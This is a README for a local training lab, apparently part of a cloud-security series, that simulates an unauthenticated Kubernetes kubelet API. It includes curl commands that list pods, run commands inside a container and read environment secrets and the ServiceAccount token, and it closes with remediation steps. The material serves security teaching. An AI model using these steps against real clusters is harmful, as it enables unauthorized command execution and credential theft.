Cloud Lab 07. K8s-Kubelet-Exposed — Flask (Python), self-contained  ✅ (exploit verified on this box)

The kubelet read/write API (normally :10250) is running with anonymous auth
enabled (--anonymous-auth=true / authorization-mode=AlwaysAllow). Anyone who can
reach it can enumerate pods AND exec commands inside their containers — no creds
required — which yields container env secrets, the pod's SA token, and RCE.

1: Get the lab:   unzip K8s-Kubelet-Exposed.zip && cd 07-K8s-Kubelet-Exposed
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   (the mock kubelet listens on :9108, standing in for the real :10250)
   # Quick win — anonymous pod enum + in-container command exec:
   curl -s localhost:9108/pods
   #   -> podList: default/prod-api, container "app"
   curl -s -X POST localhost:9108/run/default/prod-api/app -d 'cmd=id'
   #   -> uid=0(root) gid=0(root) groups=0(root)
   curl -s -X POST localhost:9108/run/default/prod-api/app -d 'cmd=env'
   #   -> AWS_ACCESS_KEY_ID=... / AWS_SECRET_ACCESS_KEY=... / DB_PASSWORD=...
   curl -s -X POST localhost:9108/run/default/prod-api/app \
        -d 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token'
   #   -> the pod's ServiceAccount token (pivot to the apiserver, cf. Lab 06)
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no cluster)
    curl

Endpoints:
    GET  /                                          -> banner (anonymous-auth ENABLED)
    GET  /pods                                       -> pod list (namespaces, containers, env)
    POST /run/{ns}/{pod}/{container}  cmd=<shell>    -> exec in container   [RCE]

List of Vulnerabilities (all verified on this box):
    Unauthenticated kubelet API — anonymous auth enabled, so /pods and /run are
        reachable with no credentials.
    Remote command execution in pods — POST /run executes arbitrary commands in
        a container (returns root).
    Secret exposure via exec — container env leaks AWS keys + DB password; the
        mounted SA token is readable, enabling a pivot to the kube-apiserver.

Remediation: set --anonymous-auth=false and authorization-mode=Webhook on the
kubelet; firewall :10250 to the control plane; keep secrets out of container env.
